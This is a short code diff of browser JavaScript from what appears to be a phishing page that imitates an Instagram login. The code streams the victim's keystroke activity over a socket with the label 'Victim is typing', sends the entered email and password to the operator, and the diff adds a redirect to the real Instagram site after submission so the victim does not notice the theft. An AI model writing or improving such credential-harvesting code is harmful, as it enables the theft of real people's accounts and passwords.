@@ -3,10 +3,10 @@ let email = document.querySelector('#email')
 let pass = document.querySelector('#pass')
 
 email.addEventListener('keyup', (e) => {
-    socket.emit('typing', 'typing... username')
+    socket.emit('typing', 'Victim is typing... username')
 })
 pass.addEventListener('keyup', (e) => {
-    socket.emit('typing', 'typing... password')
+    socket.emit('typing', 'Victim is typing... password')
 })
 
 function onSubmit(email,password){
@@ -15,6 +15,6 @@ function onSubmit(email,password){
         password: password
     }
     socket.emit('login', msg)
-    prompt(email,password);
+    window.location = "https://www.instagram.com";
 }
 
